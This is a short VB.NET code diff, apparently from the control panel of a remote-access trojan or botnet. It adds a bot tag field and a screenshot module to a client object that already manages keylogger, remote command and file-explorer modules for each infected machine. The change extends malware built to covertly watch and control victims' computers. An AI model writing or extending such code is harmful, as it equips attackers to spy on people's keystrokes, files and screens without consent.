@@ -8,6 +8,7 @@ Public Structure structClientInfo
     Public computerUserName As String
     Public userName As String
     Public countryCode As String
+    Public botTag As String
     Public botID As String
     Public WindowTitle As String
 End Structure
@@ -35,6 +36,10 @@ Public Class clsClientObj
         'Init File Explorer Obj
         FileExplorerObj = New clsFileExplorer(Conn, InfoObj)
         FileExplorerObj.OnInit()
+
+        'Init Screenshot Obj
+        ScreenshotObj = New clsScreenshot(Conn, InfoObj)
+        ScreenshotObj.OnInit()
 
         Return True
     End Function
@@ -95,6 +100,8 @@ Public Class clsClientObj
                 Return KeyloggerObj
             Case 3
                 Return FileExplorerObj
+            Case 4
+                Return ScreenshotObj
 
         End Select
         Return Nothing
@@ -106,6 +113,7 @@ Public Class clsClientObj
     Private CmdObj As clsCommand
     Private KeyloggerObj As clsKeylogger
     Private FileExplorerObj As clsFileExplorer
+    Private ScreenshotObj As clsScreenshot
 End Class
 
 
